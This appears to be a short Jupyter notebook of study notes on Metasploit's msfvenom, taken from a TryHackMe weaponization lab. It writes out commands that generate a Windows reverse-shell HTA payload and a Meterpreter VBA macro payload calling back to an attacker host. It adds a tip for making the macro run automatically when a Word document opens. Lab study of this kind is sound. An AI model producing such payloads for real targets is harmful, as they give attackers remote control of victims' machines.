{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "b6b053b8-0dd7-415f-be87-b472313603ba",
   "metadata": {},
   "source": [
    "# Msfvenom\n",
    "\n",
    "A component of Metasploit, this software can be used to create payloads.\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9c7e144c-dfcf-403e-b7e5-7ec0a2720513",
   "metadata": {},
   "source": [
    "## Create a HTA payload\n",
    "An HTA payload is a HTML application, which is a standalone web page.<br>\n",
    "The example below is from https://tryhackme.com/room/weaponization.<br>\n",
    "> msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attackerIP] LPORT=443 -f hta-psh -o thm.hta\n",
    "\n",
    "<hr>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3d020b7a-4915-499f-b681-d2f58754ff07",
   "metadata": {},
   "source": [
    "## Create a VBA Payload\n",
    "Again, from the same page, a VBA payload.\n",
    "> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba\n",
    "\n",
    "One thing on this. By default, this will create a macro for Excel (you'll see a Workbook_Open), change this to Document_Open\n",
    "\n",
    "<hr>"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}